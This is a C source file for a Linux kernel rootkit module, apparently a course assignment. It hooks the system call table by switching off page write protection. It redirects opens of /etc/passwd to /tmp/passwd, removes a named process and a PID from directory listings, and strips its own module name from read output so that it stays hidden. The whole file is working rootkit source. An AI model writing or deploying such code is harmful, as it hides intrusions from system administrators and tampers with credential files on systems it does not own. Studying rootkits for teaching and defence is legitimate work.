#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <linux/dirent.h>
#include <asm/page.h>
#include <asm/uaccess.h>
#include <asm/cacheflush.h>

#define PREFIX "sneaky_process"


//This is a pointer to the system call table
static unsigned long *sys_call_table;

int pid = 3;
module_param(pid, int, 0);

// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  if(pte->pte &~_PAGE_RW){
    pte->pte |=_PAGE_RW;
  }
  return 0;
}

int disable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  pte->pte = pte->pte &~_PAGE_RW;
  return 0;
}

// 1. Function pointer will be used to save address of the original 'openat' syscall.
// 2. The asmlinkage keyword is a GCC #define that indicates this function
//    should expect it find its arguments on the stack (not in registers).
asmlinkage int (*original_openat)(struct pt_regs *);

// Define your new sneaky version of the 'openat' syscall
asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
{
  // Implement the sneaky part here
  char original_pathname[256];  
  strncpy(original_pathname, regs->si, sizeof(original_pathname));
  original_pathname[sizeof(original_pathname) -1] = '\0';


  if(strcmp(original_pathname, "/etc/passwd") == 0){
    char new_pathname[] = "/tmp/passwd";
    copy_to_user(regs->si, new_pathname, sizeof(new_pathname));
  }
  
  return (*original_openat)(regs);
}


asmlinkage int (*original_getdents64)(struct pt_regs *);

asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs)
{
  char pid_txt[20];
  sprintf(pid_txt, "%d", pid);
  
  int original_result =  (*original_getdents64)(regs);
  int sneaky_result = original_result;
  int curr_pos = 0;
  struct linux_dirent64 * curr_dirp = regs->si;

  while(curr_pos < original_result) {
    if((strcmp(curr_dirp->d_name, "sneaky_process") == 0) || (strcmp(curr_dirp->d_name, pid_txt) == 0)){
      //printk(KERN_INFO "File name %s \n", curr_dirp->d_name);
      break;
    }
    curr_pos += curr_dirp->d_reclen;
    curr_dirp = (struct linux_dirent64 *) (regs->si + curr_pos);
  }

  
  if(curr_pos < original_result){
    // Found sneaky_process
    int deleted_size = curr_dirp->d_reclen;
    int remaining_size = original_result - (curr_pos + deleted_size);
    sneaky_result -= deleted_size;
    struct linux_dirent64 *  next_dirp = (struct linux_dirent64 *) (regs->si + curr_pos + deleted_size);
    memmove(curr_dirp, next_dirp, remaining_size);
  }
  
  return sneaky_result;
}


asmlinkage int (*original_read)(struct pt_regs *);

asmlinkage int sneaky_sys_read(struct pt_regs *regs)
{
  int original_result = (*original_read)(regs);

  
  char * original_buf = (char *) regs->si;
  char * sneaky_mod_buf = strstr(original_buf, "sneaky_mod");
  
  if( sneaky_mod_buf != NULL){
    char * after_sneaky_mod_buf = strchr(sneaky_mod_buf, '\n');
    if(after_sneaky_mod_buf != NULL){

      int line_size = after_sneaky_mod_buf - sneaky_mod_buf + 1;
      int sneaky_result = original_result - line_size;
      memmove(sneaky_mod_buf, after_sneaky_mod_buf + 1, original_result - line_size);
      return sneaky_result;
    }
    else{
      return original_result;
    }
  }
  else{
    return original_result;
  }
}

// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  // See /var/log/syslog or use `dmesg` for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");
  printk(KERN_INFO "Pid loaded is %d \n", pid);  
  // Lookup the address for this symbol. Returns 0 if not found.
  // This address will change after rebooting due to protection
  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

  // This is the magic! Save away the original 'openat' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_openat = (void *)sys_call_table[__NR_openat];
  original_getdents64 = (void *)sys_call_table[__NR_getdents64];
  original_read = (void *)sys_call_table[__NR_read]; 
  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);
  
  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
  sys_call_table[__NR_read] = (unsigned long)sneaky_sys_read;
  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_sys_getdents64;
  // You need to replace other system calls you need to hack here
  
  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);

  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  sys_call_table[__NR_openat] = (unsigned long)original_openat;
  sys_call_table[__NR_read] = (unsigned long)original_read;
  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);  
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  
MODULE_LICENSE("GPL");
